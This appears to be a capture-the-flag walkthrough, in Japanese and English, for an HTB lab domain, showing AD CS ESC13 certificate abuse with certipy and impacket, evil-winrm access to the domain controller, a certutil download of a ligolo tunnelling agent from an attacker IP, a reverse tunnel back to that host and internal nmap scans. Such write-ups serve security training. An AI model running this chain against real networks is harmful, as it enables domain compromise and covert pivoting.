# Initial Access
## hosts
```zsh
sudo vi /etc/hosts
```

```zsh
cat /etc/hosts | grep ping.htb
```
![](../../../../../assets/images/Pasted%20image%2020260504164344.png)

## Get Ticket
```zsh
faketime 'now + 8 hours' impacket-getTGT  ping.htb/c.roberts:'AssumedBreach123' -dc-ip 10.129.50.56
```
![](../../../../../assets/images/Pasted%20image%2020260504163401.png)

# 1 certipy find
役割：攻撃可能な証明書テンプレートの列挙

やっていること：

AD CSに登録されているCAとテンプレートを列挙
各テンプレートの設定を解析
「どのテンプレートが脆弱か（ESC1〜ESC13）」を判定

具体的には：

ENROLLEE_SUPPLIES_SUBJECT
Client Authentication
Any Purpose
Authenticated Users enrollment可

みたいなフラグを見て、権限昇格に使えるかを自動判定

👉 出力で見るべきポイント：

Vulnerable: True
ESC13（今回のPingPongの本丸）
テンプレート名（例：TemporaryWinRM）
```zsh
KRB5CCNAME=c.roberts.ccache \
    faketime 'now + 8 hours' certipy-ad find -u c.roberts@ping.htb -k -no-pass \
    -target dc1.ping.htb -dc-ip 10.129.50.56 -vulnerable -enabled -text
```
![](../../../../../assets/images/Pasted%20image%2020260504163351.png)

# 2 certipy req
役割：証明書の発行（リクエスト）

やっていること：

指定したテンプレートを使ってCAに証明書を申請
条件が満たされていれば証明書が発行される

今回の文脈（ESC13）だと：

テンプレートが特定グループにマッピングされている
→ 証明書を取得するとそのグループとして扱われる

つまり：
👉 「権限付きの証明書を手に入れるフェーズ」

出力：

.pfx ファイル（秘密鍵＋証明書）
```zsh
KRB5CCNAME=c.roberts.ccache \
    faketime 'now + 8 hours' certipy-ad req -u c.roberts@ping.htb -k -no-pass \
    -target dc1.ping.htb -dc-host dc1.ping.htb -dc-ip 10.129.50.56 \
    -ca ping-DC1-CA -template TemporaryWinRM
```
![](../../../../../assets/images/Pasted%20image%2020260504163933.png)

# 3 certipy auth
役割：証明書を使ってKerberos認証（TGT取得）

やっていること：

.pfx を使ってPKINIT認証を実行
ADに対して「証明書ログイン」を行う
KerberosのTGTを取得

結果：

.ccache が生成される

👉 ここが超重要：
パスワード不要で
「証明書 → Kerberosチケット」変換している
```zsh
faketime 'now + 8 hours' \
    certipy-ad auth -pfx c.roberts.pfx -username c.roberts -domain ping.htb \
    -dc-ip 10.129.50.56 
```
![](../../../../../assets/images/Pasted%20image%2020260504163745.png)

```zsh
vi krb5_pingpong.conf
```

```zsh
cat krb5_pingpong.conf
[libdefaults]
    default_realm = PING.HTB

[realms]
    PING.HTB = {
        kdc = dc1.ping.htb
    }

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB
```
![](../../../../../assets/images/Pasted%20image%2020260504163209.png)

```zsh
export KRB5_CONFIG=krb5_pingpong.conf  
```

```zsh
KRB5CCNAME=c.roberts.ccache \
faketime 'now + 8 hours' \
evil-winrm -i dc1.ping.htb -r ping.htb
```


# Internal Discovery
![](../../../../../assets/images/Pasted%20image%2020260504161620.png)

## nltest
```zsh
nltest /domain_trusts
```
![](../../../../../assets/images/Pasted%20image%2020260505053051.png)

## BloodHound
![](../../../../../assets/images/Pasted%20image%2020260505050051.png)

## Download ligolo agent
```zsh
certutil -urlcache -f http://10.10.15.168/agent.exe agent.exe
```


![](../../../../../assets/images/Pasted%20image%2020260504170017.png)

![](../../../../../assets/images/Pasted%20image%2020260504170119.png)

## ligolo connect
```zsh
cp ~/github/Tools/Tunnel/ligolo-ng/proxy/ligolo-ng_proxy_0.8.3_linux_amd64/proxy . 
./proxy -selfcert
```
![](../../../../../assets/images/Pasted%20image%2020260504170517.png)

```zsh
.\agent.exe -connect 10.10.15.168:11601 -ignore-cert
```
![](../../../../../assets/images/Pasted%20image%2020260504170558.png)

![](../../../../../assets/images/Pasted%20image%2020260504170622.png)

![](../../../../../assets/images/Pasted%20image%2020260504170730.png)

# Lateral Movement
## Host scan
```zsh
nmap -Pn -p 80,445,3389,22,135 192.168.2.2-10 --open
```
![](../../../../../assets/images/Pasted%20image%2020260504184841.png)
192.168.2.2 arive

## Port scan
```zsh
nmap -Pn -p- 192.168.2.2 --min-rate=5000 --open
```
![](../../../../../assets/images/Pasted%20image%2020260504185007.png)

## Port scan
```zsh
nmap -Pn 192.168.2.2 -A
```
![](../../../../../assets/images/Pasted%20image%2020260504190644.png)
![](../../../../../assets/images/Pasted%20image%2020260504190706.png)
pong.htb



